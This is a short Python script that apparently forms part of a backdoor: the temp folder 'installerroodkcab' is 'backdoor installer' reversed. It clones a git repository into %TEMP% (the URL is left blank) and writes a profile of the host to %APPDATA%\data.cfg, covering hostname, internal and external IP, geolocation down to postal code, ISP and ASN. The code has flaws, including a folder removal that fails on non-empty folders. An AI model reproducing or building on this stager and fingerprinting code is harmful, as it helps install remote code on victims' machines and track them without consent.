import configparser
import os
import socket
import requests
import uuid
import datetime
import gitHelper


def installer():
    if os.path.exists(path=os.getenv("TEMP") + "\installerroodkcab"):
        os.rmdir(path=os.getenv("TEMP") + "\installerroodkcab")
    gitHelper.clone(url="", clone_path=os.getenv("TEMP") + "\installerroodkcab")
    os.chdir(os.getenv("TEMP") + "\installerroodkcab")
    print(os.getcwd())


def getExternalIP():
    return requests.get("https://api.ipify.org").text


def getLoc(ip_address):
    return requests.get(f'http://ipapi.co/{ip_address}/json').json()


def getUUID():
    return str(uuid.uuid4())


def write_data():
    rate_limit_error = {'error': True, 'reason': 'RateLimited',
                        'message': 'Visit https://ipapi.co/ratelimited/ for details'}

    location_data = getLoc(getExternalIP())

    if location_data == rate_limit_error:
        exit(0)

    os.chdir(os.getenv('APPDATA'))

    config = configparser.ConfigParser()

    config['DATA'] = {'HOSTNAME': f'{socket.gethostname()}',
                      'DEVICE_ID': f'{getUUID()}',
                      'IP': f'{socket.gethostbyname(socket.gethostname())}',
                      'EXTERNAL_IP': f'{getExternalIP()}',
                      'COUNTRY': f'{location_data["country_name"]}',
                      'CITY': f'{location_data["city"]}',
                      'REGION': f'{location_data["region"]}',
                      'REGION_CODE': f'{location_data["region_code"]}',
                      'COUNTRY_CAPITAL': f'{location_data["country_capital"]}',
                      'COUNTRY_CODE': f'{location_data["country_code"]}',
                      'COUNTRY_CODE_ISO3': f'{location_data["country_code_iso3"]}',
                      'COUNTRY_CALLING_CODE': f'{location_data["country_calling_code"]}',
                      'LANGUAGE': f'{location_data["languages"]}',
                      'POSTAL': f'{location_data["postal"]}',
                      'CURRENCY': f'{location_data["currency"]}',
                      'CURRENCY_NAME': f'{location_data["currency_name"]}',
                      'TIMEZONE': f'{location_data["timezone"]}',
                      'CURRENT_TIME': f'{datetime.datetime.now()}',
                      'IN_EU': f'{location_data["in_eu"]}',
                      'ASN': f'{location_data["asn"]}',
                      'PROVIDER': f'{location_data["org"]}'}

    with open('data.cfg', 'w') as configfile:
        config.write(configfile)
        configfile.flush()
        configfile.close()

installer()